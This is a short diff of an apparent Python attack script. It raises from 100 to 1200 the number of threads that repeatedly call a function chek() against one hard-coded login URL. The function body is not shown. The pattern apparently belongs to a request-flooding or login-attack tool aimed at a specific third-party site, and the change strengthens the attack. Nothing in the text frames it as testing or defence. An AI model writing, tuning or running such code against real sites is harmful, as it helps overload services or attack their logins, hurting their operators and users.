@@ -18,7 +18,7 @@ def chek(url):
 
 def start_threads():
     target_url = "https://viphexor2.hexor1.xyz/login"
-    for _ in range(100):
+    for _ in range(1200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
